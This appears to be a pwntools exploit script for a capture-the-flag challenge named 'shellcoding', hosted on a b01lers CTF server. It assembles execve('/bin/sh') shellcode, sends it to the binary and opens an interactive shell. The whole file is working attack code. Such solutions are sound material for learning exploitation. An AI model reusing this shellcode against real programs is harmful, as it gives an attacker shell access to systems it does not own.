#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./shellcoding')
context.log_level = 'INFO'

if not args.REMOTE:
	context.log_file = 'local.log'
	p = process(binary.path)
else:
	context.log_file = 'remote.log'
	p = remote('chal.ctf.b01lers.com', 1007)

payload = asm(f'''
mov edi,{hex(binary.search(b'/bin/sh').__next__())}
xor rsi,rsi
xor rdx,rdx
mov al,0x3b
syscall
''')

log.info('payload length: ' + str(len(payload)))

p.sendafter('walk through it.\n',payload)
p.interactive()
